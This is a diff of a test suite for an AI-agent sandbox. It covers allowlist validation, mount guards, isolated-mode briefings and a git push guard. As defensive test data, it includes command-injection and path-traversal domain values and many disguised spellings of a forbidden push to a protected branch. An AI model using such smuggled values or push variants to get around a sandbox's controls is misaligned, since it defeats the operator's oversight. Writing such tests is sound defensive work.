+    covered="$(bash "$REPO_ROOT/test/shellcheck.sh" --list)"
+    while IFS= read -r f; do
+        [ -f "$REPO_ROOT/$f" ] || continue
+        first="$(head -1 "$REPO_ROOT/$f")"
+        case "$first" in
+            '#!'*python*|'#!'*node*|'#!'*perl*) continue ;;   # not shell
+            '#!'*sh*) ;;                                      # shell, by shebang
+            *)
+                # No shebang: a sourced fragment counts, anything else does not.
+                case "$f" in *.sh) ;; *) continue ;; esac ;;
+        esac
+        grep -qx "$f" <<< "$covered" || missing+=("$f")
+    done < <(cd "$REPO_ROOT" && git ls-files | grep -vE '^(web/node_modules|tools/)')
+
+    [ ${#missing[@]} -eq 0 ] \
+        || { echo "not shellchecked:"; printf '  %s\n' "${missing[@]}"; return 1; }
+}
+
+@test "the run's cached ranges are written where the suite reads them, to the filter only" {
+    # Two halves that have to name the same path, in two files, with the suite
+    # falling back silently when it is absent - so a rename would quietly
+    # restore the per-container fetch this exists to stop.
+    local wf="$REPO_ROOT/.gitea/workflows/tests.yml" rt="$REPO_ROOT/test/runtime.bats"
+    local cache=/tmp/dejima-ci/github-meta.json
+    grep -qF "out=$cache" "$wf" \
+        || { echo "the privileged job no longer caches the ranges at $cache"; return 1; }
+    grep -qF "$cache:/run/forge-meta-cache.json:ro" "$rt" \
+        || { echo "runtime.bats does not mount $cache read-only"; return 1; }
+    grep -qF 'EGRESS_FORGE_META_URL=file:///run/forge-meta-cache.json' "$rt" \
+        || { echo "runtime.bats does not point the policy at the mount"; return 1; }
+
+    # Read-only, and to the filter container rather than to both: the session
+    # half has no business holding a path that names the forge's ranges.
+    local filter_run
+    filter_run="$(sed -n '/docker run -d --init --name "\$filter"/,/^    wait_filter/p' "$rt")"
+    [ -n "$filter_run" ] || { echo "could not find the filter run in start_pair"; return 1; }
+    grep -q 'meta\[@\]' <<< "$filter_run" \
+        || { echo "the cache does not reach the filter container"; return 1; }
+    local session_run
+    session_run="$(sed -n '/docker run -d --init --name "\$session"/,/^    wait_ready/p' "$rt")"
+    [ -n "$session_run" ] || { echo "could not find the session run in start_pair"; return 1; }
+    grep -q 'meta\[@\]' <<< "$session_run" \
+        && { echo "the cache is mounted into the session container too"; return 1; }
+
+    # The job clears that directory before writing, so a run cannot read the
+    # ranges a previous one cached.
+    local clear_at write_at
+    clear_at="$(grep -n 'find /tmp/dejima-ci -mindepth 1 -delete' "$wf" | cut -d: -f1)"
+    write_at="$(grep -n "out=$cache" "$wf" | cut -d: -f1)"
+    [ -n "$clear_at" ] && [ -n "$write_at" ] || { echo "the clear or the write is gone"; return 1; }
+    [ "$clear_at" -lt "$write_at" ] \
+        || { echo "the cache is written before the directory is cleared"; return 1; }
+}
+
+@test "the confined CI job installs the tool its port-collision test needs" {
+    # remote.bats skips the dejima-ttyd port-collision refusal without `ss`,
+    # and the confined job installed no iproute2 - so the one check guarding a
+    # reverse-proxy port takeover was a permanent `ok # skip` in CI, which is
+    # the same as not having it.
+    local wf="$REPO_ROOT/.gitea/workflows/tests.yml" job
+    # The confined job's own install line, not the privileged one's: they are
+    # separate steps and only this suite's tests need the tool.
+    job="$(sed -n '/^  confined:/,/^  [a-z]/p' "$wf")"
+    [ -n "$job" ] || { echo "no confined job in the workflow"; return 1; }
+    grep -q 'apt-get install.*iproute2' <<< "$job" \
+        || { echo "the confined job installs no iproute2, so the port test skips"; return 1; }
+
+    # And the test really does key on that tool, or this pins an install
+    # nothing needs.
+    grep -q "command -v ss >/dev/null 2>&1 || skip" "$REPO_ROOT/test/remote.bats" \
+        || { echo "remote.bats no longer skips on ss; drop this"; return 1; }
 }
 
 @test "CI runs every confined suite, not just the ones someone remembered" {
@@ -2558,9 +2975,9 @@ _classify() {  # <value> -> prints addr|name, or exits non-zero on a refusal
     # own settings schema - are the plugin's now. Core creates the file and
     # decides where it is mounted; what goes in it is the harness's.
     run grep -nE '\$HOME/\.claude/(settings\.json|CLAUDE\.md)' "$REPO_ROOT/bin/dejima"
-    [ "$status" -ne 0 ] || { echo "core still names a harness config file:"; echo "$output"; return 1; }
+    [ "$status" -eq 1 ] || { echo "core still names a harness config file:"; echo "$output"; return 1; }
     run grep -n 'sandbox: {enabled' "$REPO_ROOT/bin/dejima"
-    [ "$status" -ne 0 ] || { echo "core still generates the harness's settings schema"; return 1; }
+    [ "$status" -eq 1 ] || { echo "core still generates the harness's settings schema"; return 1; }
 }
 
 @test "the override layer is mounted outside ~/.claude and passed as --settings" {
@@ -2570,7 +2987,7 @@ _classify() {  # <value> -> prints addr|name, or exits non-zero on a refusal
     # A container-local path can't be renamed over from the host.
     grep -qE '^\s*-\s*\$\{SANDBOX_SETTINGS_FILE.*\}:/etc/dejima-settings\.json:ro\s*$' "$SANDBOX_DIR/docker-compose.yml"
     run grep -E '^\s*-\s*\$\{SANDBOX_SETTINGS_FILE.*\}:\$\{HOME\}/' "$SANDBOX_DIR/docker-compose.yml"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
     # Which only takes effect if the flag is actually passed. It goes in the
     # wrapper rather than the entrypoint so it also covers invocations the
     # entrypoint never sees (an interactive shell, claudecode.nvim).
@@ -2641,7 +3058,7 @@ _classify() {  # <value> -> prints addr|name, or exits non-zero on a refusal
     # Nothing needs them now that sandbox.enabled is forced off - if they
     # come back, it's worth asking why before just re-adding them.
     run grep -E '^\s*(bubblewrap|socat)\s*\\?\s*$' "$SANDBOX_DIR/Dockerfile"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
 }
 
 @test "the briefing never tells the agent to worktree outside the mounted project" {
@@ -2653,8 +3070,298 @@ _classify() {  # <value> -> prints addr|name, or exits non-zero on a refusal
     # something the hook carries anymore - see providers.bats/config.bats
     # for the hook's own (much narrower) job.
     run grep -E '(worktree add|git worktree)[^\\n]*\.\./' "$REPO_ROOT/bin/dejima-provider-lib.sh"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
     grep -q '.worktrees/' "$REPO_ROOT/bin/dejima-provider-lib.sh"
+}
+
+# A briefing is the one thing a session cannot check for itself, so the four
+# sentences an isolated launch makes false are worth a test each rather than a
+# count. A session that believes its transcript outlives the container leaves
+# work for a resume that cannot happen; one that believes ~/shared is shared
+# with every session against this project treats a handoff as readable by
+# people who will never see it.
+@test "the isolated briefing does not claim a mount, a memory or a resume" {
+    local iso ord
+    ord="$(lib briefing_compose gitea worktree-pr claude-code)" || { echo "$ord"; return 1; }
+    iso="$(DEJIMA_ISOLATED=1 bash -c \
+        'source "$1"; briefing_compose gitea worktree-pr claude-code' _ \
+        "$REPO_ROOT/bin/dejima-provider-lib.sh" 2>&1)" || { echo "$iso"; return 1; }
+
+    # Each claim is asserted absent from the isolated briefing AND present in
+    # the ordinary one. Either half alone passes on prose that was reworded
+    # out of both.
+    local claim
+    for claim in \
+        'bind-mounted read-write and is the real' \
+        'every session against this project shares it' \
+        "this session's transcript outlives the container" \
+        'The project directory is mounted whole' \
+        'The worktree MUST live under the mounted project'
+    do
+        grep -qF "$claim" <<< "$ord" \
+            || { echo "the ordinary briefing no longer says: $claim"; return 1; }
+        grep -qF "$claim" <<< "$iso" \
+            && { echo "the isolated briefing still says: $claim"; return 1; }
+    done
+
+    # And what it says instead, because dropping the sentences without
+    # replacing them leaves a session to assume the usual arrangement.
+    for claim in \
+        'Nothing of the user'"'"'s machine is mounted here' \
+        'made fresh for this session' \
+        'This session cannot be resumed' \
+        'There is no project directory'
+    do
+        grep -qF "$claim" <<< "$iso" \
+            || { echo "the isolated briefing does not say: $claim"; return 1; }
+    done
+
+    # The harness fragment is what promises the resume, and it is replaced
+    # rather than dropped - so the resume command must not survive either.
+    grep -qF 'claude --resume' <<< "$ord" \
+        || { echo "the ordinary briefing no longer carries the resume command"; return 1; }
+    grep -qF 'claude --resume' <<< "$iso" \
+        && { echo "the isolated briefing offers a resume that cannot work"; return 1; }
+    return 0
+}
+
+@test "the mode a briefing is composed for cannot be set from the environment alone" {
+    # DEJIMA_ISOLATED reaching the composer from the environment is how the
+    # test above drives it, which is exactly why bin/dejima must bind it
+    # before anything reads it: an inherited value would otherwise decide
+    # what a session is told about a launch that is not isolated at all.
+    grep -q '^DEJIMA_ISOLATED=0$' "$REPO_ROOT/bin/dejima" \
+        || { echo "bin/dejima does not bind DEJIMA_ISOLATED before use"; return 1; }
+    # And the flag is the only thing that turns it on, which is the whole of
+    # "a CLI flag and nothing else".
+    local sets
+    sets="$(grep -c 'DEJIMA_ISOLATED=1' "$REPO_ROOT/bin/dejima")"
+    [ "$sets" = 1 ] \
+        || { echo "bin/dejima sets DEJIMA_ISOLATED=1 in $sets places, not just the flag"; return 1; }
+    grep -q -- '--isolated)          DEJIMA_ISOLATED=1; shift ;;' "$REPO_ROOT/bin/dejima" \
+        || { echo "the flag is not what sets it"; return 1; }
+}
+
+@test "the host-side features that read a transcript are not started for an isolated launch" {
+    # Three things key on a workspace that an isolated launch has no host
+    # side of: the epitaph, the conversation shipper and the audit. Each
+    # would otherwise do its work against /dejima/work - a path that is not
+    # on the host at all - and report nothing, which is the shape of a
+    # feature that looks present and is not.
+    #
+    # Two of the three are off because the flag overrides their config key,
+    # which is what makes the banner and --print-config agree with what
+    # actually happens - they said "epitaph on" while nothing was kept. So
+    # what is asserted here differs by feature: the overrides for those two,
+    # and the mode check for the audit, which has no key to override.
+    local src="$REPO_ROOT/bin/dejima" flat key call
+    # Continuations flattened, so a guard split across lines still reads as
+    # one condition.
+    flat="$(sed -z 's/\\\n[[:space:]]*/ /g' "$src")"
+
+    for key in epitaph.enabled logging.conversation; do
+        grep -qF "_set_override $key off" <<< "$flat" \
+            || { echo "an isolated launch does not turn $key off"; return 1; }
+    done
+    # Under the flag and nowhere else: an unconditional override would turn
+    # the feature off for every launch.
+    awk '
+        /^if \[ "\$DEJIMA_ISOLATED" = 1 \]; then/ { inblock = 1; next }
+        inblock && /^fi/ { inblock = 0 }
+        inblock && /_set_override (epitaph\.enabled|logging\.conversation) off/ { n++ }
+        END { exit !(n == 2) }
+    ' <<< "$flat" \
+        || { echo "the two overrides are not both inside the isolated block"; return 1; }
+    # And each feature still reads the key, so the override is what decides.
+    grep -qF 'config_get_bool epitaph enabled' <<< "$flat" \
+        || { echo "the epitaph no longer reads its own key"; return 1; }
+    grep -qF 'config_get_bool logging conversation' <<< "$flat" \
+        || { echo "the shipper no longer reads its own key"; return 1; }
+
+    # The audit has no config key to override, so it is gated on the mode.
+    for call in 'dejima-audit" snapshot' 'dejima-audit" compare'; do
+        grep -qF "$call" <<< "$flat" \
+            || { echo "bin/dejima no longer calls: $call"; return 1; }
+        awk -v call="$call" '
+            index($0, "DEJIMA_ISOLATED") { guard = NR }
+            index($0, call) { if (guard && NR - guard <= 8) found = 1 }
+            END { exit !found }
+        ' <<< "$flat" \
+            || { echo "no DEJIMA_ISOLATED guard precedes: $call"; return 1; }
+    done
+    return 0
+}
+
+@test "a seed staged after the mount guard is still refused over a writable mount" {
+    # The seed list is loaded twice: once with the other list loads, where the
+    # mount guard runs, and once after harness_prepare_config, because a hook
+    # whose job is to make a file has to run before the list that mounts it.
+    #
+    # The second pass could have rested on an argument - what a plugin adds
+    # there is a path dejima made this run - and that is true of the one
+    # plugin that does it today and not a property of the mechanism. So the
+    # rule is applied again, and this is the refusal being driven: nothing in
+    # the tree exercises it, because no shipped plugin derives a seed from
+    # state the hook changed.
+    # Wired in, first: the behaviour below is driven against the function, so
+    # nothing there would notice the call being deleted. It runs immediately
+    # after the second load and before anything is mounted.
+    local flat
+    flat="$(sed -z 's/\\\n[[:space:]]*/ /g' "$REPO_ROOT/bin/dejima")"
+    # awk rather than a two-line grep pattern: `grep -F` reads one of those
+    # as two alternatives and matches either line, so the check passed with
+    # the call deleted. What has to hold is the adjacency.
+    awk '
+        prev == "harness_seed_load" && $0 == "_refuse_rw_over_harness_host_config" { found = 1 }
+        { prev = $0 }
+        END { exit !found }
+    ' <<< "$flat" \
+        || { echo "no seed load is followed by the guard"; return 1; }
+
+    local out
+    run bash -c '
+        set -Eeuo pipefail
+        src="'"$SANDBOX_DIR"'/../bin"
+        eval "$(sed -n "/^_paths_overlap()/,/^}/p" "$src/dejima-harness-lib.sh")"
+        eval "$(sed -n "/^_refuse_rw_over_harness_host_config()/,/^}/p" "$src/dejima")"
+        # Stubbed, because what is under test is the refusal rather than how
+        # the list is assembled - which has its own tests further up.
+        # Captured first, under a name the function does not declare local:
+        # inside it, $2 is the function'"'"'s own argument, and `guarded` is one
+        # of its locals - which under set -u is unset rather than ours.
+        t_guarded="$2"
+        _harness_host_config() { HARNESS_HOST_CONFIG+=("$t_guarded"); }
+        RW_MOUNT_PATHS=("$1")
+        _refuse_rw_over_harness_host_config
+        echo ALLOWED' _ /tmp/dejima-t-rw /tmp/dejima-t-rw/inside/config.json
+    [ "$status" -ne 0 ] \
+        || { echo "a writable mount over a staged seed was allowed: $output"; return 1; }
+    [[ "$output" == *"Refusing writable mount"* ]] \
+        || { echo "the refusal does not say what it refused: $output"; return 1; }
+    [[ "$output" == *"once its per-run configuration"* ]] \
+        || { echo "the refusal does not say why it is late: $output"; return 1; }
+
+    # And a path that does not overlap is left alone, so the refusal is about
+    # the overlap rather than about there being any seed at all.
+    run bash -c '
+        set -Eeuo pipefail
+        src="'"$SANDBOX_DIR"'/../bin"
+        eval "$(sed -n "/^_paths_overlap()/,/^}/p" "$src/dejima-harness-lib.sh")"
+        eval "$(sed -n "/^_refuse_rw_over_harness_host_config()/,/^}/p" "$src/dejima")"
+        # Captured first, under a name the function does not declare local:
+        # inside it, $2 is the function'"'"'s own argument, and `guarded` is one
+        # of its locals - which under set -u is unset rather than ours.
+        t_guarded="$2"
+        _harness_host_config() { HARNESS_HOST_CONFIG+=("$t_guarded"); }
+        RW_MOUNT_PATHS=("$1")
+        _refuse_rw_over_harness_host_config
+        echo ALLOWED' _ /tmp/dejima-t-rw /tmp/dejima-t-elsewhere/config.json
+    [ "$status" -eq 0 ] && [ "$output" = ALLOWED ] \
+        || { echo "an unrelated writable mount was refused: $output"; return 1; }
+}
+
+@test "every store dejima refuses to mount is one it warns about inside the workspace" {
+    # Two lists that have to say the same thing. GUARDED_STORES is what a
+    # [mounts] entry or --ro/--rw is refused for naming;
+    # warn_if_inside_workspace is what an operator hears when the same path is
+    # inside the project being mounted instead. The workspace mount itself is
+    # not refused - that is a deliberate decision with its own tests - so the
+    # warning is the whole of what a session's own project gets.
+    #
+    # They drifted: three stores were warned about and six were guarded, so a
+    # path dejima would not mount through one route was mounted silently
+    # through the widest one.
+    #
+    # Checked by name in both directions rather than against a list kept here,
+    # which would need the same updating the code does.
+    local src="$REPO_ROOT/bin/dejima" flat guarded warned missing="" n
+    flat="$(sed -z 's/\\\n[[:space:]]*/ /g' "$src")"
+    guarded="$(sed -n 's/^[[:space:]]*GUARDED_STORES=(\(.*\))[[:space:]]*$/\1/p' <<< "$flat" \
+        | grep . | head -1)"
+    [ -n "$guarded" ] || { echo "GUARDED_STORES could not be read"; return 1; }
+    warned="$(grep '^warn_if_inside_workspace ' <<< "$flat")"
+    n="$(grep -c '^warn_if_inside_workspace ' <<< "$flat")"
+    [ "$n" -ge 6 ] || { echo "only $n stores are warned about"; return 1; }
+
+    # Every name the guarded list resolves a store through has to appear in a
+    # warning. Names rather than whole expressions, because two of the
+    # entries nest a command substitution inside another and no single
+    # tokenising of that is worth trusting.
+    local name
+    while IFS= read -r name; do
+        [ -n "$name" ] || continue
+        grep -qF -- "$name" <<< "$warned" \
+            || missing="$missing $name"
+    done < <(grep -oE '\$\(([a-z_]+)|\$([A-Z_]+)' <<< "$guarded" \
+        | sed 's/^\$(\?//' | sort -u)
+    [ -z "$missing" ] \
+        || { echo "guarded but never warned about:$missing"; return 1; }
+
+    # And the other direction: a warning for something the mount guard does
+    # not cover would be the two lists disagreeing the other way.
+    while IFS= read -r name; do
+        [ -n "$name" ] || continue
+        grep -qF -- "$name" <<< "$guarded" \
+            || missing="$missing $name"
+    done < <(sed -n 's/^warn_if_inside_workspace "[^"]*"[[:space:]]*"\?\$(\?\([A-Za-z_]*\).*/\1/p' <<< "$flat" \
+        | grep . | sort -u)
+    [ -z "$missing" ] \
+        || { echo "warned about but not guarded:$missing"; return 1; }
+}
+
+@test "the compose file's volumes can each be replaced for one launch" {
+    local compose="$SANDBOX_DIR/docker-compose.yml"
+    # The working directory is the one entry with no usable default: an
+    # isolated launch must mount no host path there, and a compose list entry
+    # cannot be empty. So bin/dejima always supplies the whole spec, and the
+    # file fails loudly rather than mounting something unintended.
+    grep -q '\${SANDBOX_WORKSPACE_MOUNT:?' "$compose" \
+        || { echo "the workspace mount is not a single required variable"; return 1; }
+    grep -qE '^\s*-\s*\$\{WORKSPACE_DIR[:?]' "$compose" \
+        && { echo "the workspace is still mounted from WORKSPACE_DIR directly"; return 1; }
+
+    # Every volume that outlives a container is named through a variable, so a
+    # launch can be given its own - and every default has to be the name
+    # Docker would have chosen without one, or a release silently swaps a
+    # volume for a fresh empty one and orphans what was in it.
+    #
+    # That name is `<compose project>_<key>`, so the check derives it from the
+    # file rather than listing the four. A default that merely looks right -
+    # the key alone, which is most of it - is the mistake this is here for,
+    # and it is one a list of expected strings would have been updated to
+    # match.
+    local project
+    project="$(sed -nE 's/^name:[[:space:]]*([a-z0-9_-]+)[[:space:]]*$/\1/p' "$compose")"
+    [ -n "$project" ] || { echo "the compose file sets no project name"; return 1; }
+
+    local checked=0 key default
+    while IFS=$'\t' read -r key default; do
+        checked=$((checked + 1))
+        [ "$default" = "${project}_${key}" ] \
+            || { echo "volume $key defaults to '$default', not '${project}_${key}'"
+                 echo "- so a launch that sets nothing gets a different volume"
+                 return 1; }
+    done < <(awk '
+        /^volumes:/ { in_block = 1; next }
+        in_block && /^[^[:space:]]/ { in_block = 0 }
+        in_block && /^  [a-z0-9_-]+:[[:space:]]*$/ {
+            key = $1; sub(/:$/, "", key); next
+        }
+        in_block && /^    name:/ && key != "" {
+            # name: ${VAR:-default}
+            if (match($0, /:-[^}]+\}/)) {
+                d = substr($0, RSTART + 2, RLENGTH - 3)
+                print key "\t" d
+            }
+            key = ""
+        }
+    ' "$compose")
+
+    # A loop over nothing passes. Four volumes today, and a fifth would have
+    # to be read by this rather than bypass it.
+    [ "$checked" -ge 4 ] \
+        || { echo "only $checked volume default(s) were checked"; return 1; }
+    return 0
 }
 
 @test "the worktree-pr workflow tells the agent to close issues via the PR body" {
@@ -2749,6 +3456,133 @@ _classify() {  # <value> -> prints addr|name, or exits non-zero on a refusal
     run "$REPO_ROOT/bin/dejima-allow" --container dejima-test-suite-nonexistent-target 'crates.io'
     [ "$status" -ne 0 ]
     [[ "$output" != *"Not a valid domain"* ]]
+}
+
+# Several domains in one command, which is what an agent asks for when a
+# toolchain fetches from more than one host. The cap and the confirmation are
+# what make that safe to say yes to: a list is where an unwanted name rides
+# along unread, and the agent that suggested the command is what might have put
+# it there.
+#
+# Its own store, so none of these touches the operator's real approvals.
+_allow() {  # _allow <args...>; prints what the run said
+    ALLOW_HOME="${ALLOW_HOME:-$(mktemp -d "$BATS_TEST_TMPDIR/allowhome.XXXXXX")}"
+    run env HOME="$ALLOW_HOME" DEJIMA_CONFIG_DIR="$ALLOW_HOME/cfg" \
+        "$REPO_ROOT/bin/dejima-allow" "$@" < /dev/null
+}
+_allowed_now() { tr '\n' ' ' < "$ALLOW_HOME/cfg/allowed-domains" 2>/dev/null; }
+
+@test "bin/dejima-allow takes several domains, and refuses more than it will be read" {
+    unset ALLOW_HOME
+    local many
+    many="$(seq -f 'd%g.example' 1 21)"
+    # shellcheck disable=SC2086
+    _allow --global $many
+    [ "$status" -ne 0 ] || { echo "21 domains were accepted"; return 1; }
+    [[ "$output" == *"at most 20 at once"* ]] || { echo "$output"; return 1; }
+    [ -z "$(_allowed_now)" ] || { echo "the refusal still wrote: $(_allowed_now)"; return 1; }
+
+    # Twenty is the boundary and reaches the confirmation, which with no
+    # terminal is a refusal rather than an assumed answer either way.
+    many="$(seq -f 'd%g.example' 1 20)"
+    # shellcheck disable=SC2086
+    _allow --global $many
+    [ "$status" -ne 0 ]
+    [[ "$output" == *"needs a terminal to confirm on"* ]] \
+        || { echo "twenty did not reach the confirmation: $output"; return 1; }
+    [ -z "$(_allowed_now)" ] || { echo "a declined list was written: $(_allowed_now)"; return 1; }
+}
+
+@test "bin/dejima-allow validates every domain before it shows any of them" {
+    # The list the operator confirms has to be the list that gets added, so one
+    # bad entry refuses the whole command - and every bad one is named, or
+    # fixing a list of ten means running it ten times.
+    unset ALLOW_HOME
+    _allow --global good.example 'evil.com;touch /tmp/pwned' 'evil.com/../etc'
+    [ "$status" -ne 0 ]
+    # The refusal has to be the VALIDATION one. Without it the command still
+    # refuses - it has no terminal to confirm on - and the names still appear,
+    # in the list it was about to ask about. So this asserts which refusal it
+    # was, or it passes on a command that validates nothing.
+    [[ "$output" == *"Not valid domains:"* ]] \
+        || { echo "not refused for being invalid: $output"; return 1; }
+    [[ "$output" != *"About to allow"* ]] \
+        || { echo "an invalid list was offered for confirmation: $output"; return 1; }
+    [[ "$output" != *"needs a terminal"* ]] \
+        || { echo "refused for the terminal rather than the entries: $output"; return 1; }
+    [[ "$output" == *"evil.com;touch /tmp/pwned"* ]] && [[ "$output" == *"evil.com/../etc"* ]] \
+        || { echo "not every invalid entry was named: $output"; return 1; }
+    [ -z "$(_allowed_now)" ] \
+        || { echo "a list containing an invalid entry wrote anything: $(_allowed_now)"; return 1; }
+    # And the valid one beside them is not approved on its own.
+    [[ "$output" != *"Added good.example"* ]] || { echo "$output"; return 1; }
+}
+
+@test "bin/dejima-allow asks before adding several, and no is the default" {
+    # Driven on a real pty, because the confirmation is deliberately refused
+    # without one - so a pipe cannot exercise the path that matters. `|| true`
+    # on the substitution: declining exits non-zero by design, and under bats
+    # errexit that would abort the test before it read the output.
+    local out
+    for answer in '' 'n' 'no'; do
+        ALLOW_HOME="$(mktemp -d "$BATS_TEST_TMPDIR/declined.XXXXXX")"
+        out="$(printf '%s\n' "$answer" | env HOME="$ALLOW_HOME" \
+            DEJIMA_CONFIG_DIR="$ALLOW_HOME/cfg" timeout 30 \
+            script -qec "$REPO_ROOT/bin/dejima-allow --global a.example b.example" /dev/null 2>&1 || true)"
+        [[ "$out" == *"Nothing was added"* ]] \
+            || { echo "answering '$answer' did not decline: $out"; return 1; }
+        [ ! -s "$ALLOW_HOME/cfg/allowed-domains" ] \
+            || { echo "answering '$answer' added: $(cat "$ALLOW_HOME/cfg/allowed-domains")"; return 1; }
+    done
+
+    # And yes adds all of them. The positive control: without it, every
+    # assertion above is equally satisfied by a command that adds nothing ever.
+    for answer in 'y' 'yes'; do
+        ALLOW_HOME="$(mktemp -d "$BATS_TEST_TMPDIR/accepted.XXXXXX")"
+        out="$(printf '%s\n' "$answer" | env HOME="$ALLOW_HOME" \
+            DEJIMA_CONFIG_DIR="$ALLOW_HOME/cfg" timeout 30 \
+            script -qec "$REPO_ROOT/bin/dejima-allow --global a.example b.example" /dev/null 2>&1 || true)"
+        grep -qx a.example "$ALLOW_HOME/cfg/allowed-domains" \
+            && grep -qx b.example "$ALLOW_HOME/cfg/allowed-domains" \
+            || { echo "answering '$answer' did not add both: $out"; return 1; }
+    done
+}
+
+@test "bin/dejima-allow prints the list one per line, and only names that passed validation" {
+    # One per line because a name off the right edge of a narrow terminal is a
+    # name nobody read - which is the whole mechanism this rests on. And the
+    # pattern allows letters, digits, hyphens and dots and nothing else, so no
+    # entry reaching that printout can carry an escape sequence that rewrites
+    # the lines above it.
+    unset ALLOW_HOME
+    _allow --global first.example second.example
+    [[ "$output" == *"About to allow 2 domains:"* ]] || { echo "$output"; return 1; }
+    local listed
+    listed="$(printf '%s\n' "$output" | sed -n 's/^  \([a-z0-9.]*\.example\)$/\1/p')"
+    [ "$listed" = "first.example
+second.example" ] || { echo "not one per line: [$listed]"; return 1; }
+
+    grep -q 'a-zA-Z0-9' <<< "$(sed -n '/_bad=()/,/^fi$/p' "$REPO_ROOT/bin/dejima-allow")" \
+        || { echo "the validation no longer restricts the character set"; return 1; }
+}
+
+@test "bin/dejima-allow still takes one domain with no confirmation at all" {
+    # The behaviour this had before, unchanged: one name is one decision the
+    # operator already made by typing it, and a prompt there would be a prompt
+    # on every ordinary use.
+    unset ALLOW_HOME
+    _allow --global only.example
+    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
+    [[ "$output" != *"About to allow"* ]] || { echo "one domain was confirmed: $output"; return 1; }
+    [[ "$output" == *"Added only.example"* ]] || { echo "$output"; return 1; }
+    [ "$(_allowed_now)" = "only.example " ] || { echo "store: $(_allowed_now)"; return 1; }
+}
+
+@test "bin/dejima-allow collapses a repeated domain rather than asking twice" {
+    unset ALLOW_HOME
+    _allow --global dup.example DUP.EXAMPLE dup.example other.example
+    [[ "$output" == *"About to allow 2 domains:"* ]] \
+        || { echo "repeats were counted separately: $output"; return 1; }
 }
 
 @test "the dedicated SSH key mount is optional, not a hard requirement" {
@@ -2861,7 +3695,7 @@ _classify() {  # <value> -> prints addr|name, or exits non-zero on a refusal
     local f
     for f in forges/gitea/bin/gitea-pr forges/gitea/bin/gitea-issue forges/gitea/bin/gitea-actions; do
         run grep -n 'curl.*Authorization: token' "$REPO_ROOT/$f"
-        [ "$status" -ne 0 ]
+        [ "$status" -eq 1 ]
         grep -q 'curl -sS -w .*-K -' "$REPO_ROOT/$f"
     done
 }
@@ -3293,7 +4127,7 @@ STUB
     # under the same-looking /actions/runs/N/jobs/M prefix, and it is fine.
     local f="$REPO_ROOT/forges/gitea/bin/gitea-actions"
     run grep -nE '\$\{?GITEA_API\}?[^"]*actions/(runs|jobs)' "$f"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
     # The three it may use instead, each reachable with plain read access.
     grep -q 'actions/tasks' "$f"
     grep -q 'commits/.*statuses' "$f"
@@ -3308,7 +4142,7 @@ STUB
     # printf for the same reason; this keeps the forge CLIs consistent with
     # them.
     run grep -rn 'column -t' "$REPO_ROOT/forges/"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
 }
 
 @test "gitea-issue is installed into the image alongside gitea-pr" {
@@ -3736,6 +4570,16 @@ _git_guard() {
         DEJIMA_FORGE_NAME=gitea bash "$SANDBOX_DIR/git-guard.sh" -C "$repo" "$@" 2>&1 | head -1
 }
 
+# The hook's verdict on a command string, the way a harness hands it over.
+# Prints whatever it said; a block is an exit of 2, so the caller reads the
+# text rather than the status.
+_push_hook() {  # <repo> <command string>
+    printf '{"tool_input":{"command":%s},"cwd":%s}' \
+        "$(jq -Rn --arg c "$2" '$c')" "$(jq -Rn --arg d "$1" '$d')" \
+        | DEJIMA=1 DEJIMA_PUSH_HOSTS="forge.invalid" DEJIMA_BLOCKED_BRANCHES="main" \
+          DEJIMA_FORGE_NAME=gitea bash "$REPO_ROOT/hooks/git-push-guard.sh" 2>&1 || true
+}
+
 _guard_repo() {
     local d
     d="$(mktemp -d "$BATS_TEST_TMPDIR/guardrepo.XXXXXX")"
@@ -3757,13 +4601,66 @@ _guard_repo() {
     # Each of these is the same push wearing different clothes. The hook this
     # supplements matched a regex over a command string and had to anticipate
     # the spelling; argv does not care.
-    for form in "push origin main" "push origin HEAD:main" "push --repo=origin main" \
-                "push --repo origin main" "push -o ci.skip origin main"; do
+    #
+    # Every one of these names the same branch. `+` is the force marker and
+    # belongs to the refspec rather than to the branch, so the destination is
+    # read with it removed. And a destination that does not start with refs/ is
+    # matched against the remote's refs by git's rev-parse rules, so heads/main
+    # and main are both refs/heads/main.
+    for form in "push origin main" "push origin HEAD:main" \
+                "push -o ci.skip origin main" \
+                "push origin +main" "push origin +refs/heads/main" \
+                "push origin +feature:main" "push --force origin main" \
+                "push --force-with-lease origin main" "push origin :main" \
+                "push origin heads/main" "push origin feature:heads/main" \
+                "push origin +feature:heads/main" "push origin refs/heads/main"; do
         # shellcheck disable=SC2086
         run _git_guard "$repo" $form
         [[ "$output" == *"aren't allowed in the sandbox"* ]] \
             || { echo "not blocked: git $form -> $output"; return 1; }
     done
+
+    # Each strip above has to leave an unprotected destination alone, or it is
+    # the stripping that refuses rather than the policy.
+    local ok
+    for ok in "push origin +feature" "push origin feature:heads/other" \
+              "push origin heads/other"; do
+        # shellcheck disable=SC2086
+        run _git_guard "$repo" $ok
+        [[ "$output" != *"Blocked by dejima"* ]] \
+            || { echo "refused an unprotected destination: git $ok -> $output"; return 1; }
+    done
+}
+
+@test "a positional remote beats --repo, the way git documents it" {
+    # git: "this option is equivalent to the <repository> argument. If both are
+    # specified, the command-line argument takes precedence." Read the other
+    # way round, `git push --repo=origin other-remote feature` resolved and
+    # approved origin's URL while git pushed to other-remote - whose host
+    # nothing had checked.
+    local repo; repo="$(_guard_repo)"
+
+    for form in "push --repo=origin elsewhere feature" "push --repo origin elsewhere feature"; do
+        # shellcheck disable=SC2086
+        run _git_guard "$repo" $form
+        [[ "$output" == *"may only push to"* ]] \
+            || { echo "checked the wrong remote: git $form -> $output"; return 1; }
+        [[ "$output" == *"evil.invalid"* ]] \
+            || { echo "it named the wrong host: $output"; return 1; }
+    done
+
+    # And --repo alone still names the remote, or it would be an opaque flag
+    # and the push would be checked against a remote the command never named.
+    run _git_guard "$repo" push --repo=elsewhere
+    [[ "$output" == *"evil.invalid"* ]] || { echo "$output"; return 1; }
+    run _git_guard "$repo" push --repo=origin
+    [[ "$output" != *"Blocked by dejima"* ]] || { echo "$output"; return 1; }
+
+    # `git push --repo=origin main` is a push to a remote called "main" by the
+    # rule above, which is exactly how git reads it - so the refusal is the
+    # unresolvable-remote one rather than the branch policy.
+    run _git_guard "$repo" push --repo=origin main
+    [[ "$output" == *"cannot resolve the remote 'main'"* ]] || { echo "$output"; return 1; }
